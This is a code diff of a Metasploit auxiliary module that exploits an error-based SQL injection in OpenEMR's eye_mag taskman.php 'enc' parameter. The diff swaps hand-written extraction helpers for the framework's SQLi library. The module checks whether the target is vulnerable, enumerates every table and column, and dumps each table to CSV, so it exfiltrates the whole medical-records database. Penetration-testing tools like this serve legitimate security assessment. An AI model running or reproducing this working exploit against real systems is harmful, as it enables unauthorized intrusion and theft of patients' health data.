@@ -7,6 +7,7 @@ require 'csv'
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::SQLi
 
   def initialize(info = {})
     super(update_info(info,
@@ -73,7 +74,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_response(payload)
-    response = send_request_cgi(
+    send_request_cgi(
       'method' => 'GET',
       'uri' => normalize_uri(uri, 'interface', 'forms', 'eye_mag', 'taskman.php'),
       'vars_get' => {
@@ -86,110 +87,6 @@ class MetasploitModule < Msf::Auxiliary
         'enc' => "1' and updatexml(1,concat(0x7e, (#{payload})),0) or '"
       }
     )
-    response
-  end
-
-  def parse_xpath_error(response_body)
-    matches = response_body.match %r{XPATH syntax error: '~(.*)'</font.*$}
-    return matches[1] if matches
-  rescue IndexError
-    nil
-  end
-
-  def exec_payload_and_parse(payload)
-    response = get_response(payload)
-    body = response.nil? ? '' : response.body
-    parse_xpath_error(body)
-  end
-
-  def complete_where_clause(where_clause, not_in_clause)
-    where_clause ||= ''
-    if !where_clause.empty? && !not_in_clause.empty?
-      where_clause = 'WHERE ' + where_clause + ' AND ' + not_in_clause
-    elsif where_clause.empty? && !not_in_clause.empty?
-      where_clause = 'WHERE ' + not_in_clause
-    elsif !where_clause.empty? && not_in_clause.empty?
-      where_clause = 'WHERE ' + where_clause
-    end
-    where_clause
-  end
-
-  def fetch_complete(column_name, table_name, where_condition, not_in_clause)
-    offset = 0
-    reconstructed_value = ''
-    loop do
-      where_clause = complete_where_clause(where_condition, not_in_clause)
-      payload = "SELECT SUBSTRING(#{column_name}, #{(offset * 31) + 1}) FROM #{table_name} #{where_clause} LIMIT 1"
-      value = exec_payload_and_parse(payload)
-      reconstructed_value += value unless value.nil?
-      break if value.nil? || value.empty? || value.length < 31
-
-      offset += 1
-    end
-    reconstructed_value
-  end
-
-  def enumerate_iteratively(column_name, table_name, where_condition)
-    values = []
-
-    loop do
-      values_sql_string = "'" + values.join("','") + "'"
-      not_in_clause = values.empty? ? '' : "#{column_name} NOT IN (#{values_sql_string})"
-      value = fetch_complete(column_name, table_name, where_condition, not_in_clause)
-      break if value.nil? || value.empty?
-
-      values.push(value)
-    end
-    values
-  end
-
-  def enumerate_tables
-    enumerate_iteratively('table_name',
-                          'information_schema.TABLES',
-                          '')
-  end
-
-  def enumerate_columns(table)
-    enumerate_iteratively('column_name',
-                          'information_schema.COLUMNS',
-                          "table_name = '#{table}'")
-  end
-
-  def find_primary_key(table)
-    fetch_complete('column_name',
-                   'information_schema.KEY_COLUMN_USAGE',
-                   "table_name = '#{table}' AND CONSTRAINT_NAME ='PRIMARY'",
-                   '')
-  end
-
-  def walk_table(table)
-    primary_key = find_primary_key(table)
-    return if primary_key.nil?
-
-    columns = enumerate_columns(table)
-    key_values = enumerate_iteratively(primary_key,
-                                       table,
-                                       '')
-
-    data = [columns]
-    key_values.each do |key_value|
-      row = []
-      columns.each do |column|
-        where_condition = "#{primary_key} = #{key_value}"
-        value = fetch_complete(column, table, where_condition, '')
-        row.append(value)
-      end
-      data.append(row)
-    end
-    data
-  end
-
-  def csv_string(data)
-    s = ''
-    for row in data
-      s += row.to_csv
-    end
-    s
   end
 
   def save_csv(data, table)
@@ -201,28 +98,47 @@ class MetasploitModule < Msf::Auxiliary
       "openemr.#{safe_table}.dump",
       'application/CSV',
       rhost,
-      csv_string(data),
+      data.map(&:to_csv).join,
       "#{safe_table}.csv"
     )
   end
 
   def dump_all
-    payload = 'version()'
-    db_version = exec_payload_and_parse(payload)
+    sqli_opts = {
+      truncation_length: 31, # slices of 31 bytes of the query response are returned
+      encoder: :base64, # the web application messes up multibyte characters, better encode
+      verbose: datastore['VERBOSE']
+    }
+    sqli = create_sqli(dbms: MySQLi::Common, opts: sqli_opts) do |payload|
+      res = get_response(payload)
+      if res && (response = res.body[%r{XPATH syntax error: '~(.*?)'</font>}m, 1])
+        response
+      else
+        ''
+      end
+    end
+    unless sqli.test_vulnerable
+      fail_with Failure::NotVulnerable, 'The target does not seem vulnerable.'
+    end
+    print_good 'The target seems vulnerable.'
+    db_version = sqli.version
     print_status("DB Version: #{db_version}")
     print_status('Enumerating tables, this may take a moment...')
-    tables = enumerate_tables
+    tables = sqli.enum_table_names
     num_tables = tables.length
     print_status("Identified #{num_tables} tables.")
-
     # These tables are impossible to fetch because they increase each request
     skiptables = %w[form_taskman log log_comment_encrypt]
+    # large table containing text in different languages, >4mb in size
+    skiptables << 'lang_definitions'
     tables.each_with_index do |table, i|
       if skiptables.include?(table)
         print_status("Skipping table (#{i + 1}/#{num_tables}): #{table}")
       else
-        print_status("Dumping table (#{i + 1}/#{num_tables}): #{table}")
-        table_data = walk_table(table)
+        columns_of_table = sqli.enum_table_columns(table)
+        print_status("Dumping table (#{i + 1}/#{num_tables}): #{table}(#{columns_of_table.join(', ')})")
+        table_data = sqli.dump_table_fields(table, columns_of_table)
+        table_data.unshift(columns_of_table)
         save_csv(table_data, table)
       end
     end
